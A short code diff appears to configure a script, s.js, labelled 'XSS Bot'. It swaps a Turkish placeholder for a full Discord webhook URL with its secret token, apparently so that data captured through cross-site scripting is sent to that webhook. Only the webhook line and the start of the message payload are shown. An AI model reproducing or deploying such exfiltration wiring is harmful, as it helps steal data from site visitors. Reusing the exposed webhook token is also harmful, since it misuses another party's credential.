@@ -1,5 +1,5 @@
 // GitHub: s.js
-const webhookURL = "BURAYA_DISCORD_WEBHOOK_URL_GELECEK";
+const webhookURL = "https://discord.com/api/webhooks/1469278750876368947/evwkKVf6b9B0g50c-JVP0w3Zt3J00ZW6PiGcUfvUAlIrqHJ4C2DjnYMb3e1nHeYBYi0I";
 
 const data = {
     username: "XSS Bot - Kaptan Pengu",
